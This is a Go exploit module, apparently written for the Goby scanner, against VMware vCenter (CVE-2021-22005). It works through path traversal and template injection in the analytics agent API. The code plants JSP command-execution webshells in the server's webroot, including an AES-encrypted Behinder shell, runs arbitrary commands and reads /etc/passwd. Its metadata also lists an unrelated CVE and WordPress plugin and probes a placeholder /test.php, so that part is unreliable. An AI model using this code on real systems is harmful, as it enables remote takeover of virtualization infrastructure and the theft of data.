package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "VMware vCenter file upload (CVE-2021-22005)",
    "Description": "<p>VMware vCenter Server is a set of server and virtualization management software from Vmware. The software provides a centralized platform for managing VMware vSphere environments, which can automatically implement and deliver virtual infrastructure.</p><p>VMware vCenter Server has arbitrary file upload vulnerabilities. Attackers can upload specially crafted files through port 443 of VMware vCenter Server and execute arbitrary code on vCenter Server.</p>",
    "Product": "Vmware VCenter",
    "Homepage": "https://www.vmware.com/products/vcenter-server.html",
    "DisclosureDate": "2021-09-26",
    "Author": "keeeee",
    "FofaQuery": "body=\"VMware vSphere is virtual\"",
    "Level": "3",
    "Impact": "<p>VMware vCenter Server has arbitrary file upload vulnerabilities. Attackers can upload specially crafted files through port 443 of VMware vCenter Server and execute arbitrary code on vCenter Server.</p>",
    "Recommandation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0020.html\">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a><br></p>",
    "References": [
        "https://kb.vmware.com/s/article/85717",
        "https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,GetShell,Behinder_webshell"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        },
        {
            "name": "passwd",
            "type": "input",
            "value": "vulgo",
            "show": "AttackType=GetShell"
        },
        {
            "name": "password",
            "type": "input",
            "value": "rebeyond",
            "show": "AttackType=Behinder_webshell"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "fileupload"
    ],
    "CVEIDs": [
        "CVE-2021-24146"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "modern-events-calendar-lite"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "VulType": [
        "fileupload"
    ],
    "CVE": "CVE-2021-22005",
    "PocId": "10226",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/analytics/telemetry/ph/api/hyper/send?_c&_i=test"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/json")
			cfg.Data = "test"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 201 {
					agentName := goutils.RandomHexString(5)
					// step 1 :createAgent
					payloadUrl := "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=" + agentName + "&_i=test2"
					cfg := httpclient.NewPostRequestConfig(payloadUrl)
					cfg.Header.Store("Content-Type", "application/json")
					cfg.Header.Store("Cache-Control", "max-age=0")
					cfg.Header.Store("Upgrade-Insecure-Requests", "1")
					cfg.Header.Store("X-Deployment-Secret", "abc")
					cfg.FollowRedirect = false
					cfg.Data = `{"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}`
					cfg.VerifyTls = false
					httpclient.DoHttpRequest(u, cfg)

					// step2 : 测试
					manifestData := `{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`
					payloadUrl = "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=" + agentName + "&_i=test2"
					cfg = httpclient.NewPostRequestConfig(payloadUrl)
					cfg.Header.Store("Content-Type", "application/json")
					cfg.Header.Store("Cache-Control", "max-age=0")
					cfg.Header.Store("Upgrade-Insecure-Requests", "1")
					cfg.Header.Store("X-Deployment-Secret", "abc")
					cfg.FollowRedirect = false
					cfg.Data = manifestData
					cfg.VerifyTls = false
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 200 {
							return true
						}
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// cmd ,webshell 发的是一样的包，只是返回不同。Behinder_webshell 不同的地方是 step 3 中发送的马为冰蝎马，其他 step 发包都是一样的。
			attackType := ss.Params["AttackType"].(string)

			agentName := goutils.RandomHexString(5)
			// step 1 :createAgent
			payloadUrl := "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=" + agentName + "&_i=test2"
			cfg := httpclient.NewPostRequestConfig(payloadUrl)
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.Data = `{"manifestSpec":{},"objectType":"a2","collectionTriggerDataNeeded":true,"deploymentDataNeeded":true,"resultNeeded":true,"signalCollectionCompleted":true,"localManifestPath":"a7","localPayloadPath":"a8","localObfuscationMapPath":"a9"}`
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)

			// step2 : 修改日志文件位置
			webshell := goutils.RandomHexString(5)
			manifestData := `{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##\n                        $a.logger.parent.getAppender(\"LOGFILE\").setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp\")##\n                        $a.logger.parent.getAppender(\"LOGFILE\").activateOptions()##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`
			payloadUrl = "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=" + agentName + "&_i=test2"
			cfg = httpclient.NewPostRequestConfig(payloadUrl)
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.Data = manifestData
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)

			// step3 写恶意 jsp 木马到日志中:
			cfg = httpclient.NewPostRequestConfig("/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=mtusf5&_i=test2")
			cfg.Data = `<% out.println("<999999999999999999999999999>");String[] c = {"/bin/bash","-c",request.getParameter("vulgo")};java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}out.println("<999999999999999999999999999/>");%>`
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)

			// step4 : 恢复原来的日志路径，为了其他的垃圾数据不干扰 webshell 。
			rawLog := "/var/log/vmware/analytics/analytics.log"
			manifestData4 := `{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n   <request>\n      <query name=\"vir:VCenter\">\n         <constraint>\n            <targetType>ServiceInstance</targetType>\n         </constraint>\n         <propertySpec>\n            <propertyNames>content.about.instanceUuid</propertyNames>\n            <propertyNames>content.about.osType</propertyNames>\n            <propertyNames>content.about.build</propertyNames>\n            <propertyNames>content.about.version</propertyNames>\n         </propertySpec>\n      </query>\n   </request>\n   <cdfMapping>\n      <indepedentResultsMapping>\n         <resultSetMappings>\n            <entry>\n               <key>vir:VCenter</key>\n               <value>\n                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                     <resourceItemToJsonLdMapping>\n                     \n                        <forType>ServiceInstance</forType>\n                     <mappingCode><![CDATA[\n                        #set($a = $GLOBAL-logger)##\n                        $a.logger.parent.getAppender(\"LOGFILE\").setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + rawLog + `\")##\n                        $a.logger.parent.getAppender(\"LOGFILE\").activateOptions()##]]>\n\n                     </mappingCode>\n                     </resourceItemToJsonLdMapping>\n                  </value>\n               </value>\n            </entry>\n         </resultSetMappings>\n      </indepedentResultsMapping>\n   </cdfMapping>\n   <requestSchedules>\n      <schedule interval=\"1h\">\n         <queries>\n            <query>vir:VCenter</query>\n         </queries>\n      </schedule>\n   </requestSchedules>\n</manifest>", "objectId": "a2"}`
			payloadUrl = "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=" + agentName + "&_i=test2"
			cfg = httpclient.NewPostRequestConfig(payloadUrl)
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("X-Deployment-Secret", "abc")
			cfg.Data = manifestData4
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				// 执行命令之后删除 webshell 。
				cmd = cmd + ` && rm /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp`
				webshellUrl := `/idm/..;/` + webshell + `.jsp`

				cfg = httpclient.NewPostRequestConfig(webshellUrl)
				cfg.Data = `vulgo=` + url.QueryEscape(cmd)
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					reg := regexp.MustCompile(`(?s)<999999999999999999999999999>(.*)<999999999999999999999999999/>`)
					result := reg.FindStringSubmatch(resp.RawBody)
					if len(result) > 0 {
						expResult.Output = result[1]
						expResult.Success = true
					}
				}
			} else if attackType == "GetShell" {
				// 默认密码是 rebyond
				password := ss.Params["passwd"].(string)
				if len(password) == 0 {
					password = "vulgo"
				}
				webshellUrl := "/idm/..;/" + webshell + ".jsp"
				newWebshell := goutils.RandomHexString(5)
				newWebshellUrl := "/idm/..;/" + newWebshell + ".jsp"

				// 利用 webshell 写入新的回显 webshell ， 并且删除之前的 webshell
				cfg = httpclient.NewPostRequestConfig(webshellUrl)
				webshellCode := `<% String[] c = {"/bin/bash","-c",request.getParameter("` + password + `")};java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>`
				webshellCode = base64.StdEncoding.EncodeToString([]byte(webshellCode))
				cmd := `echo ` + webshellCode + `| base64 -d | tee ` + `/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + newWebshell + `.jsp && rm /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp`
				cmd = url.QueryEscape(cmd)
				cfg.Data = `vulgo=` + cmd
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)

				cfg = httpclient.NewPostRequestConfig(newWebshellUrl)
				cfg.Data = `vulgo=cat+/etc/passwd`
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if regexp.MustCompile(`root:[x*]?:0:`).MatchString(resp.RawBody) {
						expResult.Output += "Webshell :" + expResult.HostInfo.FixedHostInfo + newWebshellUrl + "\n"
						expResult.Output += "Password : vulgo \n"
						expResult.Success = true
					}
				}
			} else if attackType == "Behinder_webshell" {
				// 默认密码是 rebyond
				password := ss.Params["password"].(string)
				if len(password) == 0 {
					password = "rebeyond"
				}
				hash := fmt.Sprintf("%x", md5.Sum([]byte(password)))
				key := hash[0:16]
				behinderWebshell := goutils.RandomHexString(5)
				webshellUrl := "/idm/..;/" + webshell + ".jsp"
				behinderWebshellUrl := "/idm/..;/" + behinderWebshell + ".jsp"

				// 利用 webshell 写入冰蝎马 , 并且删除之前的 webshell
				cfg = httpclient.NewPostRequestConfig(webshellUrl)
				behinderWebshellCode := `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="` + key + `";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				behinderWebshellCode = base64.StdEncoding.EncodeToString([]byte(behinderWebshellCode))
				cmd := `echo ` + behinderWebshellCode + `| base64 -d | tee ` + `/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + behinderWebshell + `.jsp && rm /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/` + webshell + `.jsp`
				cmd = url.QueryEscape(cmd)
				cfg.Data = `vulgo=` + cmd
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)

				// 检查是否写入
				cfg = httpclient.NewGetRequestConfig(behinderWebshellUrl)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode != 404 {
						expResult.Output = expResult.HostInfo.FixedHostInfo + behinderWebshellUrl + "\n-----------Using Behinder_v3.0 to connect, password is rebeyond"
						expResult.Success = true
					}
				}
			}

			return expResult
		},
	))
}
